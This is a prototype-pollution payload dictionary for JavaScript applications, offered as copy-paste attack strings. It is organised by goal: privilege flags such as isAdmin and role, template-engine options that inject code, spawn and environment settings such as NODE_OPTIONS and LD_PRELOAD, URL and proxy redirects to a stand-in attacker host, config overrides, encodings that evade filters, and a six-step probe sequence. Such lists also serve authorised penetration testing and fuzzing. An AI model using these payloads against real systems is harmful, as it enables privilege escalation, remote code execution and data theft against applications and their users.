# Payload dictionary — the corpus by carrier and sink

Copy-paste shapes. Organized by what the payload must DO: write the
marker, reach the sink, escape the filter, land the payoff.

---

## 1. The marker payload (the harmless proof)

```json
{"__proto__": {"ppmarker": "v1"}}
{"__proto__": {"ppmarker": {"nested": "v1"}}}
{"a": {"__proto__": {"ppmarker": "v1"}}}
{"a": {"b": {"__proto__": {"ppmarker": "v1"}}}}
{"constructor": {"prototype": {"ppmarker": "v1"}}}
{"a": {"constructor": {"prototype": {"ppmarker": "v1"}}}}
{"__proto__": {"ppmarker": true}}
{"__proto__": {"ppmarker": 1}}
{"__proto__": {"ppmarker": [1]}}
{"__proto__": {"ppmarker": {"a":1}}}
```

The marker's shape variants — a string proves key-write, a nested
object proves nested-write, `true`/`1`/`[]` test typed-property
handling.

## 2. The authz corpus

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"admin": true}}
{"__proto__": {"is_admin": true}}
{"__proto__": {"isAdminUser": true}}
{"__proto__": {"superuser": true}}
{"__proto__": {"isSuperuser": true}}
{"__proto__": {"staff": true}}
{"__proto__": {"isStaff": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"roles": ["admin"]}}
{"__proto__": {"role_id": 1}}
{"__proto__": {"user_type": "admin"}}
{"__proto__": {"type": "admin"}}
{"__proto__": {"level": "admin"}}
{"__proto__": {"kind": "admin"}}
{"__proto__": {"verified": true}}
{"__proto__": {"active": true}}
{"__proto__": {"enabled": true}}
{"__proto__": {"approved": true}}
{"__proto__": {"confirmed": true}}
{"__proto__": {"email_verified": true}}
{"__proto__": {"banned": false}}
{"__proto__": {"suspended": false}}
{"__proto__": {"locked": false}}
{"__proto__": {"permissions": ["*"]}}
{"__proto__": {"scopes": ["admin"]}}
{"__proto__": {"perms": ["*"]}}
{"__proto__": {"capabilities": ["admin"]}}
{"__proto__": {"acl": ["*"]}}
{"__proto__": {"owner_id": "<your-id>"}}
{"__proto__": {"user_id": "<your-id>"}}
{"__proto__": {"tenant_id": "<your-tenant>"}}
{"__proto__": {"org_id": "<your-org>"}}
{"__proto__": {"sub": "admin"}}
{"__proto__": {"uid": 0}}
{"__proto__": {"id": 1}}
{"__proto__": {"username": "admin"}}
{"__proto__": {"email": "a@t.tld"}}
```

## 3. The template corpus

```json
{"__proto__": {"outputFunctionName": "x;__append('PP');var y"}}
{"__proto__": {"outputFunctionName": "x;require('fs').writeFileSync('/tmp/o','flag');var y"}}
{"__proto__": {"localsName": "a);CODE;var y"}}
{"__proto__": {"destructureLocals": ["x;CODE;var y"]}}
{"__proto__": {"escape": "x;CODE;var y"}}
{"__proto__": {"escapeFunction": "function(x){return CODE()}"}}
{"__proto__": {"imports": {"require": "require"}}}
{"__proto__": {"imports": {"fs": "require('fs')"}}}
{"__proto__": {"variable": "x;CODE;var y"}}
{"__proto__": {"delimiter": "?"}}
{"__proto__": {"compileDebug": true}}
{"__proto__": {"root": "/etc"}}
{"__proto__": {"views": ["/etc"]}}
{"__proto__": {"filename": "/etc/passwd"}}
{"__proto__": {"basedir": "/"}}
{"__proto__": {"filters": {"x": "/tmp/x.js"}}}
{"__proto__": {"globals": ["x;CODE;var y"]}}
{"__proto__": {"name": "x;CODE;var y"}}
{"__proto__": {"helpers": {"x": "/tmp/x.js"}}}
{"__proto__": {"partials": {"x": "ATTACKER"}}}
{"__proto__": {"autoescape": false}}
{"__proto__": {"allowProtoPropertiesByDefault": true}}
{"__proto__": {"allowProtoMethodsByDefault": true}}
{"__proto__": {"extensions": {"x": "/tmp/x.js"}}}
{"__proto__": {"loader": {"searchPaths": ["/etc"]}}}
{"__proto__": {"self": true}}
{"__proto__": {"client": true}}
{"__proto__": {"tags": {"blockStart": "<%"}}}
{"__proto__": {"delimiters": ["<%","%>"]}}
{"__proto__": {"sourceURL": "x"}
```

## 4. The spawn/env corpus

```json
{"__proto__": {"shell": true}}
{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/x"}}}
{"__proto__": {"env": {"NODE_OPTIONS": "--eval 'CODE'"}}}
{"__proto__": {"env": {"NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}}
{"__proto__": {"env": {"LD_PRELOAD": "/tmp/x.so"}}}
{"__proto__": {"env": {"PATH": "/tmp"}}}
{"__proto__": {"env": {"BASH_ENV": "/tmp/x"}}}
{"__proto__": {"env": {"ENV": "/tmp/x"}}}
{"__proto__": {"env": {"PYTHONPATH": "/tmp"}}}
{"__proto__": {"env": {"PERL5OPT": "-M/tmp/x"}}}
{"__proto__": {"env": {"RUBYOPT": "-r/tmp/x"}}}
{"__proto__": {"env": {"GIT_SSH_COMMAND": "/tmp/x"}}}
{"__proto__": {"env": {"SSH_ASKPASS": "/tmp/x"}}}
{"__proto__": {"env": {"EDITOR": "/tmp/x"}}}
{"__proto__": {"env": {"PAGER": "/tmp/x"}}}
{"__proto__": {"env": {"http_proxy": "http://attacker"}}}
{"__proto__": {"execPath": "/tmp/node"}}
{"__proto__": {"execArgv": ["--eval","CODE"]}}
{"__proto__": {"cwd": "/tmp"}}
{"__proto__": {"stdio": "inherit"}}
{"__proto__": {"detached": true}}
{"__proto__": {"argv0": "bash"}}
{"__proto__": {"uid": 0}}
{"__proto__": {"gid": 0}}
{"__proto__": {"workerData": {"eval": "CODE"}}}
{"__proto__": {"modulePath": "/tmp/x.js"}}
{"__proto__": {"module": "/tmp/x"}}
{"__proto__": {"main": "/tmp/x.js"}}
{"__proto__": {"paths": ["/tmp/node_modules"]}}
{"__proto__": {"extensions": {".js": "/tmp/x"}}}
{"__proto__": {"specifier": "file:///tmp/x.mjs"}}
{"__proto__": {"dir": "/tmp"}}
```

## 5. The request/url corpus (SSRF-adjacent)

```json
{"__proto__": {"url": "http://attacker/"}}
{"__proto__": {"uri": "http://attacker/"}}
{"__proto__": {"hostname": "attacker"}}
{"__proto__": {"host": "attacker"}}
{"__proto__": {"port": 80}}
{"__proto__": {"path": "/admin"}}
{"__proto__": {"baseURL": "http://attacker/"}}
{"__proto__": {"baseUrl": "http://attacker/"}}
{"__proto__": {"proxy": "http://attacker:8080"}}
{"__proto__": {"agent": {"proxy": "http://attacker"}}}
{"__proto__": {"rejectUnauthorized": false}}
{"__proto__": {"headers": {"Authorization": "Bearer x"}}}
{"__proto__": {"headers": {"X-Admin": "1"}}}
{"__proto__": {"timeout": 30000}}
{"__proto__": {"maxRedirects": 0}}
{"__proto__": {"followRedirect": false}}
{"__proto__": {"qs": "admin=1"}}
{"__proto__": {"query": "admin=1"}}
{"__proto__": {"callbackUrl": "http://attacker/"}}
{"__proto__": {"webhook": "http://attacker/"}}
{"__proto__": {"notifyUrl": "http://attacker/"}}
{"__proto__": {"importUrl": "http://attacker/"}}
{"__proto__": {"avatar": "http://attacker/i.png"}}
{"__proto__": {"image": "http://attacker/i.png"}}
{"__proto__": {"icon": "http://attacker/i.png"}}
{"__proto__": {"src": "http://attacker/x.js"}}
{"__proto__": {"href": "javascript:CODE"}}
{"__proto__": {"fetch": "http://attacker/"}}
```

## 6. The config corpus

```json
{"__proto__": {"debug": true}}
{"__proto__": {"dev": true}}
{"__proto__": {"verbose": true}}
{"__proto__": {"development": true}}
{"__proto__": {"production": false}}
{"__proto__": {"cache": false}}
{"__proto__": {"main": "/tmp/x.js"}}
{"__proto__": {"entry": "/tmp/x.js"}}
{"__proto__": {"plugins": ["/tmp/x.js"]}}
{"__proto__": {"middleware": ["/tmp/x.js"]}}
{"__proto__": {"secret": "x"}}
{"__proto__": {"signingKey": "x"}}
{"__proto__": {"key": "x"}}
{"__proto__": {"cookie": {"signed": false}}}
{"__proto__": {"session": {"secure": false}}}
{"__proto__": {"allowedHosts": ["*"]}}
{"__proto__": {"whitelist": ["*"]}}
{"__proto__": {"allowlist": ["*"]}}
{"__proto__": {"uploadDir": "/tmp"}}
{"__proto__": {"dest": "/tmp"}}
{"__proto__": {"filename": "/tmp/x"}}
{"__proto__": {"view engine": "ejs"}}
{"__proto__": {"views": "/tmp"}}
{"__proto__": {"trust proxy": true}}
{"__proto__": {"view cache": false}}
{"__proto__": {"logger": {"level": "silly"}}}
{"__proto__": {"log": {"level": "debug"}}}
{"__proto__": {"level": "debug"}}
{"__proto__": {"silent": false}}
{"__proto__": {"store": "/tmp/x"}}
{"__proto__": {"keyPrefix": "attacker"}}
{"__proto__": {"prefix": "attacker"}}
{"__proto__": {"driver": "attacker"}}
{"__proto__": {"client": "attacker"}}
{"__proto__": {"serialize": "x"}}
{"__proto__": {"deserialize": "x"}}
{"__proto__": {"transport": {"host": "attacker"}}}
{"__proto__": {"format": "%s"}}
{"__proto__": {"formatter": "x"}}
{"__proto__": {"output": "/tmp/x"}}
{"__proto__": {"outFile": "/tmp/x"}}
{"__proto__": {"file": "/tmp/x"}}
{"__proto__": {"layout": "/tmp/x"}}
{"__proto__": {"header": "x"}}
{"__proto__": {"footer": "x"}}
```

## 7. The qs/form/urlencoded corpus

```
__proto__[m]=1
__proto__.m=1
a[__proto__][m]=1
a[b][__proto__][m]=1
constructor[prototype][m]=1
a[constructor][prototype][m]=1
__proto__%5Bm%5D=1
%5f%5fproto%5f%5f%5bm%5d=1
__prot%6f__%5bm%5d=1
__proto__[m][]=1
__proto__[m][x]=1
settings[__proto__][m]=1
config[__proto__][m]=1
theme[__proto__][m]=1
opts[__proto__][m]=1
input[__proto__][m]=1
data[__proto__][m]=1
payload[__proto__][m]=1
body[__proto__][m]=1
request[__proto__][m]=1
form[__proto__][m]=1
post[__proto__][m]=1
params[__proto__][m]=1
args[__proto__][m]=1
query[__proto__][m]=1
filter[__proto__][m]=1
where[__proto__][m]=1
fields[__proto__][m]=1
update[__proto__][m]=1
doc[__proto__][m]=1
object[__proto__][m]=1
entity[__proto__][m]=1
record[__proto__][m]=1
item[__proto__][m]=1
entry[__proto__][m]=1
node[__proto__][m]=1
resource[__proto__][m]=1
model[__proto__][m]=1
payload[__proto__][m]=1
```

## 8. The dotted-path corpus (for `set`/`$rename`/path-APIs)

```
__proto__.m
__proto__.m.n
a.__proto__.m
constructor.prototype.m
a.constructor.prototype.m
__proto__[m]
constructor[prototype][m]
__proto__.constructor.prototype.m
constructor.prototype.isAdmin
prototype.m
__proto__.ppmarker
__proto__.isAdmin
__proto__.role
__proto__.env.NODE_OPTIONS
__proto__.outputFunctionName
__proto__.shell
__proto__.execPath
__proto__.main
__proto__.basedir
__proto__.filename
__proto__.root
__proto__.views
__proto__.url
__proto__.hostname
__proto__.proxy
__proto__.callbackUrl
__proto__.secret
__proto__.key
__proto__.debug
__proto__.tenant_id
__proto__.owner_id
```

## 9. The escape-the-filter corpus

```json
{"__prot\u006f__": {"m": 1}}
{"__PROTO__": {"m": 1}}
{"__proto__ ": {"m": 1}}
{" __proto__": {"m": 1}}
{"__proto____": {"m": 1}}
{"__proto\x00__": {"m": 1}}
{"__proto__\u0000": {"m": 1}}
{"__proto__\t": {"m": 1}}
{"__proto__\n": {"m": 1}}
{"__proto__\r": {"m": 1}}
{"__proto__\u00a0": {"m": 1}}
{"__proto__​": {"m": 1}}
{"\u005f\u005fproto\u005f\u005f": {"m": 1}}
{"__proto__": {"m": 1}, "__proto__": {"m": 2}}
{"__proto__": [{"m": 1}]}
{"__proto__": {"__proto__": {"m": 1}}}
{"a": {"__proto__": {"b": {"__proto__": {"m": 1}}}}}
{"constructor": {"prototype": {"__proto__": {"m": 1}}}}
{"__proto__": {"constructor": {"prototype": {"m": 1}}}}
{"prototype": {"m": 1}}
{"__defineGetter__": {"m": 1}}
{"__defineSetter__": {"m": 1}}
{"__lookupGetter__": {"m": 1}}
{"__lookupSetter__": {"m": 1}}
{"__count__": {"m": 1}}
{"__noSuchMethod__": {"m": 1}}
{"__parent__": {"m": 1}}
{"__iterator__": {"m": 1}}
```

## 10. The multi-arm probe sequence

```bash
# the minimal prove-it-first sequence, 6 probes
1. {"__proto__":{"ppmarker":"v1"}}           # flat JSON
2. {"a":{"__proto__":{"ppmarker":"v1"}}}     # nested
3. {"constructor":{"prototype":{"ppmarker":"v1"}}}  # alias
4. ?__proto__[ppmarker]=v1                   # qs
5. __proto__[ppmarker]=v1                    # form
6. {"field":"__proto__.ppmarker","value":"v1"}  # path-api
```

Each arm is a falsifiable probe — a `refutes` on all six closes the
site; a `confirms` on any one is the write.
